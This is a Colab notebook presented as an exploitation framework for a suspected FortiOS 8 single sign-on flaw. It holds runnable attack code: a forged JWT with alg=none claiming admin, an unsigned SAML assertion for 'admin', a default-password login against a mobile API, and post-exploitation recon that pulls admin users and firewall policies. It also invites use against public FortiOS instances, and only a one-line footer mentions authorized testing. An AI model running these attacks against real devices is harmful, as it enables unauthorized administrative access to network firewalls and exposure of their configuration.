# FortiOS 8 KVM Lab - Basic Terminal Access (No KVM Required)
## Exploit CVE-SUSPECTED-FORTIOS8-SSO directly from Colab

This notebook runs the exploitation framework **without needing a local KVM lab**.
Use this for:
- Testing against public FortiOS 8 instances
- Direct API testing
- Learning the exploitation techniques

---

## STEP 1: Setup Environment

In [ ]:
import os
import sys
import subprocess
from pathlib import Path

print("🚀 Setting up Colab environment...\n")

# Create working directory
LAB_DIR = Path('/content/fortios8_lab')
LAB_DIR.mkdir(exist_ok=True)
os.chdir(LAB_DIR)

print(f"📁 Lab directory: {LAB_DIR}")
print(f"📍 Current directory: {os.getcwd()}")

# Install dependencies
print("\n[*] Installing dependencies...")
subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 
                'requests', 'paramiko', 'cryptography', 'flask', 'flask-cors'],
               check=False)

print("✅ Environment setup complete")

## STEP 2: Download Lab Files

In [ ]:
import urllib.request
import os

print("[*] Downloading lab files from GitHub...\n")

files_to_download = [
    'kvm_lab_server.py',
    'kvm_lab_cli.py',
    'ui.html',
    'requirements.txt',
    'kvm_lab.sh'
]

base_url = "https://raw.githubusercontent.com/netanelcyber/HAMIVTZAR/claude/cve-2026-24858-fortios-sso-p1lrtu/cve-research/CVE-SUSPECTED-FORTIOS8-SSO/"

for filename in files_to_download:
    try:
        url = base_url + filename
        print(f"   Downloading {filename}...", end=' ')
        urllib.request.urlretrieve(url, filename)
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

print(f"\n✅ Files downloaded")
print(f"\n📋 Available files:")
for f in sorted(os.listdir('.')):  
    if os.path.isfile(f) and not f.startswith('.'):
        size = os.path.getsize(f) / 1024
        print(f"   - {f:30} ({size:.1f} KB)")

## STEP 3: Configure Target

In [ ]:
# Configuration for target FortiOS 8 instance
# Modify these values for your target

TARGET_IP = "127.0.0.1"  # Change to your target IP
TARGET_PORT = 12443      # Change to your target port
TARGET_DEVICE = "FG-LAB-000001"  # Device serial number

print("🎯 Target Configuration:")
print(f"   IP:     {TARGET_IP}")
print(f"   Port:   {TARGET_PORT}")
print(f"   Device: {TARGET_DEVICE}")
print(f"\n📝 Edit the variables above to change target")

## STEP 4: Import Exploitation Framework

In [ ]:
import requests
import json
import time
from datetime import datetime

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

print("✅ Exploitation framework ready")
print(f"\n📦 Modules loaded:")
print("   - requests")
print("   - json")
print("   - time")

## STEP 5: Exploitation - JWT ALG_NONE

In [ ]:
import base64

def exploit_jwt_alg_none(target_ip, target_port):
    """Exploit JWT algorithm confusion (alg=none)"""
    print(f"🔓 Attempting JWT ALG_NONE exploit...")
    
    # Create JWT with alg=none
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
    payload = base64.urlsafe_b64encode(json.dumps({
        "user": "admin",
        "exp": int(time.time()) + 3600,
        "iat": int(time.time())
    }).encode()).decode().rstrip('=')
    
    token = f"{header}.{payload}."
    
    try:
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get(
            f'https://{target_ip}:{target_port}/api/v2/cmdb/system/admin',
            headers=headers,
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"   ✅ SUCCESS - Status: {response.status_code}")
            return {'success': True, 'vector': 'JWT_ALG_NONE', 'status_code': response.status_code}
        else:
            print(f"   ✗ Failed - Status: {response.status_code}")
            return {'success': False, 'vector': 'JWT_ALG_NONE', 'status_code': response.status_code}
    except Exception as e:
        print(f"   ✗ Error: {str(e)}")
        return {'success': False, 'vector': 'JWT_ALG_NONE', 'error': str(e)}

# Run exploit
result = exploit_jwt_alg_none(TARGET_IP, TARGET_PORT)
print(f"\n📊 Result: {json.dumps(result, indent=2)}")

## STEP 6: Exploitation - SAML Signature Bypass

In [ ]:
def exploit_saml_unsigned(target_ip, target_port):
    """Exploit SAML signature bypass"""
    print(f"🔓 Attempting SAML Signature Bypass...")
    
    # Create unsigned SAML assertion
    saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:AuthnResponse xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                     xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                     ID="_00000000000000000000000000000000" Version="2.0"
                     IssueInstant="2024-01-01T00:00:00Z" Destination="https://target/saml/acs">
  <saml:Assertion ID="_assertion" IssueInstant="2024-01-01T00:00:00Z" Version="2.0">
    <saml:Subject>
      <saml:NameID>admin</saml:NameID>
    </saml:Subject>
    <saml:AuthnStatement>
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:cm:password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:AuthnResponse>'''
    
    try:
        response = requests.post(
            f'https://{target_ip}:{target_port}/api/v1/saml/assert',
            data={'SAMLResponse': base64.b64encode(saml.encode()).decode()},
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200 or 'Set-Cookie' in response.headers:
            print(f"   ✅ SUCCESS - Status: {response.status_code}")
            return {'success': True, 'vector': 'SAML_UNSIGNED', 'status_code': response.status_code}
        else:
            print(f"   ✗ Failed - Status: {response.status_code}")
            return {'success': False, 'vector': 'SAML_UNSIGNED', 'status_code': response.status_code}
    except Exception as e:
        print(f"   ✗ Error: {str(e)}")
        return {'success': False, 'vector': 'SAML_UNSIGNED', 'error': str(e)}

# Run exploit
result = exploit_saml_unsigned(TARGET_IP, TARGET_PORT)
print(f"\n📊 Result: {json.dumps(result, indent=2)}")

## STEP 7: Exploitation - Mobile API Bypass

In [ ]:
def exploit_mobile_api(target_ip, target_port):
    """Exploit mobile API reduced validation"""
    print(f"🔓 Attempting Mobile API Bypass...")
    
    try:
        # Mobile API endpoints have reduced authentication
        response = requests.post(
            f'https://{target_ip}:{target_port}/api/mobile/login',
            json={'username': 'admin', 'password': 'admin123'},
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"   ✅ SUCCESS - Status: {response.status_code}")
            return {'success': True, 'vector': 'MOBILE_API_BYPASS', 'status_code': response.status_code}
        else:
            print(f"   ✗ Failed - Status: {response.status_code}")
            return {'success': False, 'vector': 'MOBILE_API_BYPASS', 'status_code': response.status_code}
    except Exception as e:
        print(f"   ✗ Error: {str(e)}")
        return {'success': False, 'vector': 'MOBILE_API_BYPASS', 'error': str(e)}

# Run exploit
result = exploit_mobile_api(TARGET_IP, TARGET_PORT)
print(f"\n📊 Result: {json.dumps(result, indent=2)}")

## STEP 8: Post-Exploitation Reconnaissance

In [ ]:
def run_recon(target_ip, target_port, cookie=None):
    """Post-exploitation reconnaissance"""
    print(f"🔍 Running reconnaissance...\n")
    
    headers = {}
    if cookie:
        headers['Cookie'] = f'FSESSIONID={cookie}'
    
    recon_data = {}
    
    # Get system info
    try:
        print("   [*] Fetching system information...")
        resp = requests.get(
            f'https://{target_ip}:{target_port}/api/v2/monitor/system/status',
            headers=headers,
            verify=False,
            timeout=10
        )
        if resp.status_code == 200:
            data = resp.json().get('results', [{}])[0]
            recon_data['system_info'] = data
            print(f"       ✓ Version: {data.get('version')}")
            print(f"       ✓ Serial: {data.get('serial')}")
    except Exception as e:
        print(f"       ✗ Error: {str(e)}")
    
    # Get admin users
    try:
        print("   [*] Fetching admin users...")
        resp = requests.get(
            f'https://{target_ip}:{target_port}/api/v2/cmdb/system/admin',
            headers=headers,
            verify=False,
            timeout=10
        )
        if resp.status_code == 200:
            users = resp.json().get('results', [])
            recon_data['admin_users'] = users
            print(f"       ✓ Found {len(users)} admin users:")
            for user in users:
                print(f"         - {user.get('name')}")
    except Exception as e:
        print(f"       ✗ Error: {str(e)}")
    
    # Get firewall policies
    try:
        print("   [*] Fetching firewall policies...")
        resp = requests.get(
            f'https://{target_ip}:{target_port}/api/v2/cmdb/firewall/policy',
            headers=headers,
            verify=False,
            timeout=10
        )
        if resp.status_code == 200:
            policies = resp.json().get('results', [])
            recon_data['policies'] = policies
            print(f"       ✓ Found {len(policies)} firewall policies")
    except Exception as e:
        print(f"       ✗ Error: {str(e)}")
    
    return recon_data

# Run reconnaissance
recon = run_recon(TARGET_IP, TARGET_PORT)
print(f"\n📊 Reconnaissance Results:")
print(json.dumps(recon, indent=2))

## STEP 9: Summary & Results

In [ ]:
print("\n" + "="*60)
print("FortiOS 8 KVM Lab - Exploitation Summary")
print("="*60)
print(f"\n📊 Target: {TARGET_IP}:{TARGET_PORT}")
print(f"📝 Device: {TARGET_DEVICE}")
print(f"⏰ Timestamp: {datetime.now().isoformat()}")
print("\n✅ Lab framework ready for exploitation")
print("\n📌 Next Steps:")
print("   1. Modify TARGET_IP, TARGET_PORT, TARGET_DEVICE")
print("   2. Run individual exploit cells (STEP 5-7)")
print("   3. Run reconnaissance (STEP 8)")
print("   4. Review results and findings")
print("\n🔐 For Authorized Testing Only")